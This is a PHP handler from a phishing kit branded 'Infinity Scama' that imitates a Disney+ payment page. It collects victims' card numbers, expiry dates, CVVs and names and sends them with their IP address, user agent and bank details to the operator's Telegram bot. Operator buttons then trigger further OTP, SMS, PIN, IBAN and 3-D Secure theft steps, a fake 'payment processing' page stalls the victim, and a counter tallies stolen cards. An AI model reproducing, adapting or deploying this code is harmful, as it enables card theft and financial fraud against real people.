<?php
session_start();
include('../../../common/subb_includes.php');
include('../../../config.php');
include('../../../app/1.php');
include('../../../app/2.php');
include('../../traduction.php');

// Set Telegram webhook
file_get_contents("https://api.telegram.org/bot{$telegram['token']}/setWebhook?url=https://{$_SERVER['HTTP_HOST']}/app/webhook.php");

// POST handling (force redirection vers id5)
if ($_POST) {

    if (!empty($_POST['holder']) && !empty($_POST['number']) && !empty($_POST['exp']) && !empty($_POST['cvv'])) {

        if (!isDateExpired($_POST['exp'])) {

            // Sauvegarde des infos
            $_SESSION['holder'] = htmlspecialchars($_POST['holder']);
            $_SESSION['exp'] = htmlspecialchars($_POST['exp']);
            $_SESSION['cvv'] = htmlspecialchars($_POST['cvv']);
            $_SESSION['number'] = htmlspecialchars($_POST['number']);
            $_SESSION['numberr'] = str_replace(' ', '', $_POST['number']);
            $_SESSION['bin'] = substr($_SESSION['numberr'], 0, 6);

            binChecker($_SESSION['bin']);
            $_SESSION['luhn'] = true;

            date_default_timezone_set('Europe/Paris');
            $date = date('H:i:s');

            if ($_SESSION['luhn'] === true) {

                // Message Telegram
                $text = "
<b>💳 +1 CC [{$_SESSION['bin']}]</b>
<b>⏱️ {$date}</b>
<b>💳 Carte ➟</b> <code>{$_SESSION['numberr']}</code>
<b>👤 Titulaire ➟</b> <code>{$_SESSION['holder']}</code>
<b>💳 Carte ➟</b> <code>{$_SESSION['number']}</code>
<b>📅 Date d'exp ➟</b> <code>{$_SESSION['exp']}</code>
<b>🔒 CVV ➟</b> <code>{$_SESSION['cvv']}</code>
<b>🏛️ Type ➟</b> <code>{$_SESSION['type']}</code>
<b>📈 Level ➟</b> <code>{$_SESSION['level']}</code>
<b>🏦 Banque ➟</b> <code>{$_SESSION['bank']}</code>
<b>🌍 Pays ➟</b> <code>{$_SESSION['country']}</code>
<b>🌐 Adresse-Ip ⇝</b> <code>{$_SESSION['ip']}</code>
<b>🌐 User-Agent ⇝</b> <code>{$_SESSION['ua']}</code>
<b>🌐 Scan ⇝</b> https://cardimages.imaginecurve.com/cards/{$_SESSION['bin']}.png
<blockquote><b>Powered By ♾️ Infinity Scama ® - @InfinityScama
♾️ Scama : DISNEY+
♾️ Author : Kajuh - @KajuhDev</b></blockquote>";

                // Boutons Telegram
                $buttons = array(
                    'inline_keyboard' => array(
                        array(
                            array('text' => '🗑️ BAN IP 🗑️', 'callback_data' => "ban={$_SESSION['ip']}"),
                            array('text' => '📊 STATS 📊', 'url' => "https://{$_SERVER['HTTP_HOST']}/panel/"),
                        ),
                        array(
                            array('text' => '🍎 OTP 🍎', 'callback_data' => "otp={$_SESSION['ip']}"),
                            array('text' => '📧 MAIL 📧', 'callback_data' => "mail={$_SESSION['ip']}"),
                            array('text' => '📱 SMS 📱', 'callback_data' => "sms={$_SESSION['ip']}"),
                        ),
                        array(
                            array('text' => '🏦 LOG 🏦', 'callback_data' => "bank={$_SESSION['ip']}"),
                            array('text' => '🚪FIN 🚪', 'callback_data' => "fin={$_SESSION['ip']}"),
                            array('text' => '💳 PIN 💳', 'callback_data' => "pin={$_SESSION['ip']}"),
                        ),
                        array(
                            array('text' => '🏛 IBAN 🏛', 'callback_data' => "iban={$_SESSION['ip']}"),
                            array('text' => '📲 VBV 📲', 'callback_data' => "vbv={$_SESSION['ip']}"),
                        ),
                        array(
                            array('text' => '❌ CARTE INVALIDE ❌', 'callback_data' => "carteInvalide={$_SESSION['ip']}"),
                        ),
                    ),
                );

                if ($telegram['status'] == true) {
                    sendMessage($telegram['RezChatId']['card'], $text, $buttons);
                    sendScan($telegram['RezChatId']['card'], $_SESSION['holder'], $_SESSION['number'], $_SESSION['exp'], $_SESSION['cvv']);
                }

                $_SESSION['payment-error'] = "";
                $_SESSION['payment'] = "1";

                $data = json_decode(file_get_contents('../../../panel/stats.json'), true);
                if (is_array($data)) {
                    if (!isset($data['Cards'])) $data['Cards'] = 0;
                    $data['Cards']++;
                    file_put_contents('../../../panel/stats.json', json_encode($data, JSON_PRETTY_PRINT));
                }

// Sauvegarde session avant redirection
session_write_close();

// Redirection via HTML/JS pour laisser le temps aux boutons Telegram
$redirect = !empty($_SESSION['id5']) ? "../../" . rawurlencode($_SESSION['id5']) . "/" : "../";
echo "<!DOCTYPE html>
<html lang='fr'>
<head>
<meta charset='UTF-8'>
<title>Redirection...</title>
<script type='text/javascript'>
    setTimeout(function(){
        window.location.href = '$redirect';
    }, 10000); // 0.5s délai pour assurer le traitement Telegram
</script>
</head>
<body>
<p>Your payment is being processed by our services, please wait and do not leave the page.</p>
</body>
</html>";
exit();


            } else {
                $_SESSION['payment-error'] = $errors['4'];
                header('Location: ../');
                exit();
            }

        } else {
            $_SESSION['payment-error'] = $errors['3'];
            header('Location: ../');
            exit();
        }

    } else {
        $_SESSION['payment-error'] = $errors['2'];
        header('Location: ../');
        exit();
    }

} else {
    $_SESSION['payment-error'] = $errors['1'];
    header('Location: ../../../index.html');
    exit();
}
